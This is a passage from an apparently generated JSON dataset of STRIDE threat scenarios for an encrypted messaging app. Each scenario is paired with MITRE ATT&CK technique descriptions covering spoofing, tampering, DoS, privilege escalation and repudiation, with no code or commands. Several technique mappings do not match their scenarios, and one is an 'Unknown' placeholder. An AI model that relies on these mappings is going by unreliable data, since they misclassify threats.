US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised desktop client exposes data stored in encrypted SQLite databases.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client is not adequately secured.",
                    "Role": "Application",
                    "Condition": "Weak security controls on companion devices"
                },
                {
                    "Assumption": "The encryption scheme is breakable or poorly implemented.",
                    "Role": "Application",
                    "Condition": "Vulnerable encryption practices"
                },
                {
                    "Assumption": "The attacker has persistent access to the compromised device.",
                    "Role": "Attacker",
                    "Condition": "Extended access to the system"
                }
            ],
            "Potential Impact": "Exposure of sensitive messages and user credentials.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "compromised device",
                "data exposure",
                "encryption cracking",
                "persistent access"
            ],
            "mitre_technique": {
                "name": "Compromise Host Software Binary",
                "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)",
                "id": "attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5",
                "technique_id": "T1554"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A backup system improperly secures message logs, leading to unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The backup system is reachable and lacks adequate security.",
                    "Role": "Application",
                    "Condition": "Exposed and poorly secured backup infrastructure"
                },
                {
                    "Assumption": "The logs are stored in a readable format without encryption.",
                    "Role": "Application",
                    "Condition": "Unencrypted data on backups"
                },
                {
                    "Assumption": "Attackers have knowledge of the backup system and its vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Information on system architecture"
                }
            ],
            "Potential Impact": "Unauthorized access to historical communications.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "backup compromise",
                "data exposure",
                "unencrypted storage",
                "system architecture exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the messaging server with excessive requests, rendering it inaccessible to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have protection against high traffic volume.",
                    "Role": "Application",
                    "Condition": "Lack of rate limiting or DDoS protection"
                },
                {
                    "Assumption": "The attacker's network resources allow them to generate high traffic volume.",
                    "Role": "Attacker",
                    "Condition": "Access to high-bandwidth capabilities"
                },
                {
                    "Assumption": "Legitimate users, including employees and customers, depend on timely access.",
                    "Role": "User",
                    "Condition": "Rely on the service being available for communications"
                }
            ],
            "Potential Impact": "Service unavailability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flood attack",
                "server overload",
                "high traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the messaging protocol to crash the application.",
            "Assumptions": [
                {
                    "Assumption": "The application has an unpatched vulnerability.",
                    "Role": "Application",
                    "Condition": "Undiscovered or unpatched vulnerability"
                },
                {
                    "Assumption": "The attacker has knowledge of the vulnerability and its exploit.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit details"
                },
                {
                    "Assumption": "Users rely on the application for daily communication.",
                    "Role": "User",
                    "Condition": "Dependence on the application for messaging"
                }
            ],
            "Potential Impact": "Application crashes leading to temporary loss of communication.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "protocol vulnerability",
                "application crash",
                "exploit",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets critical infrastructure, e.g., DNS servers used by the messaging application, making it difficult for users to reach the service.",
            "Assumptions": [
                {
                    "Assumption": "The DNS servers have vulnerabilities or insufficient redundancy.",
                    "Role": "Application",
                    "Condition": "Weak DNS infrastructure"
                },
                {
                    "Assumption": "The attacker can sustain a DNS-based denial-of-service attack.",
                    "Role": "Attacker",
                    "Condition": "Resources for DNS attack"
                },
                {
                    "Assumption": "Users need reliable DNS resolution to access the service.",
                    "Role": "User",
                    "Condition": "DNS dependency for reaching the application"
                }
            ],
            "Potential Impact": "Inability of users to access the messaging service.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DNS attack",
                "infrastructure",
                "service unavailability",
                "DNS disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain root access on a user's device.",
            "Assumptions": [
                {
                    "Assumption": "The device\u2019s operating system has vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Presence of exploitable bugs"
                },
                {
                    "Assumption": "The attacker is capable of executing software exploits.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency in exploit development"
                },
                {
                    "Assumption": "Users have not applied recent security patches.",
                    "Role": "User",
                    "Condition": "Outdated system software"
                }
            ],
            "Potential Impact": "Complete control over the device, compromising all stored data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "software exploits",
                "device compromise",
                "system vulnerabilities"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages improper API access controls to gain higher permissions than allowed.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack adequate access control mechanisms.",
                    "Role": "Application",
                    "Condition": "Weak API security design"
                },
                {
                    "Assumption": "The attacker can identify and exploit improper controls.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and skill in API security"
                },
                {
                    "Assumption": "The application does not perform sufficient authorization checks.",
                    "Role": "Application",
                    "Condition": "Flaws in permission checks"
                }
            ],
            "Potential Impact": "Unauthorized actions and data access within the application.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "API security",
                "access controls",
                "authorization bypass",
                "application vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised companion device is used to modify permissions or user settings on the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The companion device is compromised and linked to the primary device.",
                    "Role": "Attacker",
                    "Condition": "Successful compromise of companion device"
                },
                {
                    "Assumption": "The application syncs settings and permissions across devices.",
                    "Role": "Application",
                    "Condition": "Cross-device synchronization"
                },
                {
                    "Assumption": "The primary device does not adequately verify changes made by companion devices.",
                    "Role": "Application",
                    "Condition": "Weak verification mechanisms"
                }
            ],
            "Potential Impact": "Elevation of permissions leading to unauthorized actions on the primary device.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "cross-device",
                "permissions modification",
                "device synchronization",
                "companion device"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake messaging application that mimics the legitimate ones (e.g., WhatsApp, Signal) to harvest user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users may not verify the authenticity of the application before installation.",
                    "Role": "User",
                    "Condition": "Valid when users download applications from untrusted sources."
                },
                {
                    "Assumption": "Attackers have access to resources to create convincing replicas of legitimate applications.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has technical capability and resources."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality, Integrity, and Availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "credential harvesting",
                "device"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary intercepts the initial setup process and provides false public keys to new users, enabling them to impersonate legitimate recipients.",
            "Assumptions": [
                {
                    "Assumption": "Users rely on an unsecured network during initial setup.",
                    "Role": "User",
                    "Condition": "Valid when users perform setup over unsecured or compromised networks."
                },
                {
                    "Assumption": "The attacker has the capability to perform a man-in-the-middle attack.",
                    "Role": "Attacker",
                    "Condition": "Valid when the attacker can control communication channels during initial setup."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality and Integrity.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "cryptographic manipulation",
                "fake public key",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised device identity to masquerade as a legitimate user in the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's device is linked as a companion device before the primary device realizes the compromise.",
                    "Role": "Attacker",
                    "Condition": "Valid if the primary device is initially compromised."
                },
                {
                    "Assumption": "Users do not notice or understand alerts about new devices being linked.",
                    "Role": "User",
                    "Condition": "Valid when users lack awareness of device linking alerts."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality and Integrity.",
            "MITRE ATT&CK Keywords": [
                "device",
                "credential stealing",
                "social engineering",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical or remote access to a user\u2019s mobile device and alters the SQLite database to manipulate stored messages and keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's access to the mobile device is not detected by the user.",
                    "Role": "Attacker",
                    "Condition": "Valid if the user does not secure their device physically or digitally."
                },
                {
                    "Assumption": "Stored messages and keys are not adequately protected/encrypted.",
                    "Role": "Application Developer",
                    "Condition": "Valid when encryption measures on stored data are weak."
                }
            ],
            "Potential Impact": "Compromise of Integrity and Confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "device",
                "local access",
                "database"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the encrypted messages' metadata to alter sender information without breaking the encryption.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to intercept communication between devices.",
                    "Role": "Attacker",
                    "Condition": "Valid when communications traverse an untrusted network."
                },
                {
                    "Assumption": "Metadata is not fully protected under the encryption protocols used.",
                    "Role": "Application Developer",
                    "Condition": "Valid if the protocol used does not secure metadata adequately."
                }
            ],
            "Potential Impact": "Compromise of Integrity.",
            "MITRE ATT&CK Keywords": [
                "network",
                "encrypted metadata",
                "data manipulation",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware installed on the primary or companion device alters the encryption keys used in communications without detection.",
            "Assumptions": [
                {
                    "Assumption": "Devices are vulnerable to malware installation.",
                    "Role": "User",
                    "Condition": "Valid when devices lack adequate anti-malware protections."
                },
                {
                    "Assumption": "The application does not continuously verify the integrity of encryption keys.",
                    "Role": "Application Developer",
                    "Condition": "Valid if keys are validated only at set intervals instead of continuously."
                }
            ],
            "Potential Impact": "Compromise of Integrity and Confidentiality.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "encryption keys",
                "tampering",
                "device"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending malicious or sensitive messages by claiming that their account was compromised by an unknown attacker.",
            "Assumptions": [
                {
                    "Assumption": "Users fail to protect their devices or accounts adequately.",
                    "Role": "User",
                    "Condition": "Valid when users use weak passwords or share devices."
                },
                {
                    "Assumption": "Logs and forensic data do not provide unambiguous evidence of account activity.",
                    "Role": "Application Developer",
                    "Condition": "Valid when logging and monitoring are insufficient or tamperable."
                }
            ],
            "Potential Impact": "Compromise of Accountability.",
            "MITRE ATT&CK Keywords": [
                "account",
                "repudiation",
                "logging",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains temporary access to the messaging account and sends messages, later the user claims they never sent those messages.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are insufficient to detect unauthorized access quickly.",
                    "Role": "Application Developer",
                    "Condition": "Valid when access control does not flag or prevent unauthorized sessions."
                },
                {
                    "Assumption": "Activity logs do not capture enough detail to indisputably attribute actions to specific users.",
                    "Role": "Application Developer",
                    "Condition": "Valid with poor logging practices."
                }
            ],
            "Potential Impact": "Compromise of Accountability.",
            "MITRE ATT&CK Keywords": [
                "account",
                "logging",
                "repudiation",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Keylogging",
